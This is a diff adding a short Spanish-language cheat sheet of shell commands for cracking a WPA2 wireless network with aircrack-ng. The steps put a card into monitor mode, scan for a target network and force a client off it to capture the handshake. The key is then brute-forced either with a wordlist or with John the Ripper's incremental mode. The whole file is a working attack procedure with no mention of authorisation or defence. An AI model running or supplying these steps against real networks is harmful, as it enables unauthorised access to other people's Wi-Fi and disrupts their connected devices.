@@ -1,0 +1,40 @@
+# Ingresar como Root
+# Poner en modo monitor
+
+airmon-ng
+
+# Activar la tarjeta de red
+
+airmon-ng start wlan0
+
+# Escanear las redes existentes
+
+airodump-ng mon0
+
+# Detener las redes existentes
+
+Ctrl + C
+
+# Escanear la red especifica
+
+airodump-ng mon0 --channel 10 --bssid 00:19:5B:52:AD:F7 -w /tmp/wpa2
+
+# Inyectar trafico a la Red hasta capturar el Handshake
+
+aireplay-ng -0 1 -a 00:19:5B:52:AD:F7 -c 00:1C:BF:90:5B:A3 mon0
+
+# Detener airodump-ng
+
+Ctrl + C
+
+# Observar los archivos generados
+
+ls /tmp/wpa2* -al
+
+# Crackeo con Diccionario
+
+aircrack-ng –w /tmp/wordlists/word.lst -b 00:19:5B:52:AD:F7 /tmp/wpa2*.cap
+
+# Crackeo sin Diccionario con ayuda de Jhon The Ripper
+
+/pentest/password/jtr/john --stdout --incremental:all | aircrack-ng -b 00:19:5B:52:AD:F7 -w - /tmp/wpa2
